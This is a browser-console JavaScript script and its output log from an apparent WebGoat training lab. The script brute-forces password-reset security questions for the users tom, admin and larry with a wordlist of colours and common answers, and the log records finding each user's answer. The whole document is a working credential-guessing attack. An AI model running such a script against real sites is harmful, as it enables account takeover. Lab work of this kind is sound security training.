// Security Questions - COMPREHENSIVE Attack
// Tests more colors, numbers, and common answers

(async function() {
    console.log('===================================================================');
    console.log('SECURITY QUESTIONS COMPREHENSIVE BRUTE FORCE');
    console.log('===================================================================');
    
    // Expanded wordlist for security questions
    const answers = [
        // Common colors
        'red', 'blue', 'green', 'yellow', 'orange', 'purple', 'pink',
        'black', 'white', 'gray', 'grey', 'brown', 'cyan', 'magenta',
        'violet', 'indigo', 'turquoise', 'gold', 'silver', 'crimson',
        'navy', 'teal', 'lime', 'maroon', 'olive', 'aqua', 'fuchsia',
        'coral', 'salmon', 'peach', 'mint', 'lavender', 'tan', 'beige',
        'scarlet', 'azure', 'emerald', 'ruby', 'sapphire', 'bronze',
        // Color variations
        'lightblue', 'darkblue', 'lightgreen', 'darkgreen',
        // Common simple answers
        'none', 'no', 'yes', 'unknown', 'n/a', 'na',
        // Numbers (sometimes people use these)
        '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
        // Common password-style answers
        'test', 'password', 'admin', 'user', '123', '1234',
        // More creative colors
        'burgundy', 'chartreuse', 'periwinkle', 'mauve', 'ochre'
    ];
    
    // Target users
    const users = ['tom', 'admin', 'larry'];
    
    const results = {};
    let totalAttempts = 0;
    
    for (const user of users) {
        console.log('\n===================================================================');
        console.log('[*] Attacking user: ' + user);
        console.log('===================================================================');
        
        let found = false;
        let userAttempts = 0;
        
        for (const answer of answers) {
            userAttempts++;
            totalAttempts++;
            
            console.log('  [' + userAttempts + '/' + answers.length + '] Trying: ' + answer);
            
            try {
                // Create form data
                const formData = new URLSearchParams();
                formData.append('username', user);
                formData.append('securityQuestion', answer);
                
                const response = await fetch('/WebGoat/PasswordReset/questions', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: formData.toString()
                });
                
                const data = await response.json();
                
                // Check for success
                // Success indicators:
                // - lessonCompleted === true
                // - feedback contains "success" or "correct" (but NOT "not correct")
                // - output field has content
                const isSuccess = data.lessonCompleted === true || 
                    (data.feedback && data.feedback.toLowerCase().includes('success')) ||
                    (data.feedback && data.feedback.toLowerCase().includes('correct!')) ||
                    (data.feedback && data.feedback.toLowerCase().match(/^correct[^a-z]/i)) ||
                    (data.output && data.output.length > 0);
                
                if (isSuccess) {
                    console.log('\n');
                    console.log('  ================================================');
                    console.log('  SUCCESS! Found answer for ' + user + '!');
                    console.log('  ================================================');
                    console.log('  Security Answer: ' + answer);
                    console.log('  Full Response:');
                    console.log(JSON.stringify(data, null, 2));
                    
                    results[user] = {
                        answer: answer,
                        attempts: userAttempts,
                        response: data
                    };
                    
                    found = true;
                    break;
                }
                
                // Small delay to avoid overwhelming server
                await new Promise(resolve => setTimeout(resolve, 80));
                
            } catch (error) {
                console.log('      [ERROR] ' + error.message);
            }
        }
        
        if (!found) {
            console.log('\n  [-] No answer found for ' + user + ' (tried ' + userAttempts + ' answers)');
            results[user] = { 
                answer: 'NOT FOUND', 
                attempts: userAttempts,
                response: null 
            };
        }
    }
    
    console.log('\n\n===================================================================');
    console.log('FINAL RESULTS');
    console.log('===================================================================');
    console.log('Total attempts made: ' + totalAttempts);
    console.log('');
    
    for (const user in results) {
        console.log('User: ' + user);
        if (results[user].answer !== 'NOT FOUND') {
            console.log('  Status: SUCCESS');
            console.log('  Answer: ' + results[user].answer);
            console.log('  Attempts: ' + results[user].attempts);
            if (results[user].response && results[user].response.output) {
                console.log('  Password: ' + results[user].response.output);
            }
        } else {
            console.log('  Status: FAILED');
            console.log('  Attempts: ' + results[user].attempts);
        }
        console.log('');
    }
    
    console.log('===================================================================');
    
    // Save results to window
    window.securityQuestionsResults = results;
    console.log('Results saved to: window.securityQuestionsResults');
    
})();


//  [6/71] Trying: purple debugger eval code:48:21

debugger eval code:78:29
  ================================================ debugger eval code:79:29
  SUCCESS! Found answer for tom! debugger eval code:80:29
  ================================================ debugger eval code:81:29
  Security Answer: purple debugger eval code:82:29
  Full Response: debugger eval code:83:29
{
  "lessonCompleted": true,
  "feedback": "Congratulations. You have successfully completed the assignment.",
  "feedbackArgs": null,
  "output": null,
  "outputArgs": null,
  "assignment": "QuestionsAssignment",
  "attemptWasMade": true
} debugger eval code:84:29

=================================================================== debugger eval code:37:17
[*] Attacking user: admin debugger eval code:38:17
=================================================================== debugger eval code:39:17
  [1/71] Trying: red debugger eval code:48:21
  [2/71] Trying: blue debugger eval code:48:21
  [3/71] Trying: green debugger eval code:48:21

debugger eval code:78:29
  ================================================ debugger eval code:79:29
  SUCCESS! Found answer for admin! debugger eval code:80:29
  ================================================ debugger eval code:81:29
  Security Answer: green debugger eval code:82:29
  Full Response: debugger eval code:83:29
{
  "lessonCompleted": true,
  "feedback": "Congratulations. You have successfully completed the assignment.",
  "feedbackArgs": null,
  "output": null,
  "outputArgs": null,
  "assignment": "QuestionsAssignment",
  "attemptWasMade": true
} debugger eval code:84:29

=================================================================== debugger eval code:37:17
[*] Attacking user: larry debugger eval code:38:17
=================================================================== debugger eval code:39:17
  [1/71] Trying: red debugger eval code:48:21
  [2/71] Trying: blue debugger eval code:48:21
  [3/71] Trying: green debugger eval code:48:21
  [4/71] Trying: yellow debugger eval code:48:21

debugger eval code:78:29
  ================================================ debugger eval code:79:29
  SUCCESS! Found answer for larry! debugger eval code:80:29
  ================================================ debugger eval code:81:29
  Security Answer: yellow debugger eval code:82:29
  Full Response: debugger eval code:83:29
{
  "lessonCompleted": true,
  "feedback": "Congratulations. You have successfully completed the assignment.",
  "feedbackArgs": null,
  "output": null,
  "outputArgs": null,
  "assignment": "QuestionsAssignment",
  "attemptWasMade": true
} debugger eval code:84:29


=================================================================== debugger eval code:114:13
FINAL RESULTS debugger eval code:115:13
=================================================================== debugger eval code:116:13
Total attempts made: 13 debugger eval code:117:13
<empty string> debugger eval code:118:13
User: tom debugger eval code:121:17
  Status: SUCCESS debugger eval code:123:21
  Answer: purple debugger eval code:124:21
  Attempts: 6 debugger eval code:125:21
<empty string> debugger eval code:133:17
User: admin debugger eval code:121:17
  Status: SUCCESS debugger eval code:123:21
  Answer: green debugger eval code:124:21
  Attempts: 3 debugger eval code:125:21
<empty string> debugger eval code:133:17
User: larry debugger eval code:121:17
  Status: SUCCESS debugger eval code:123:21
  Answer: yellow debugger eval code:124:21
  Attempts: 4 debugger eval code:125:21
<empty string> debugger eval code:133:17
=================================================================== debugger eval code:136:13
Results saved to: window.securityQuestionsResults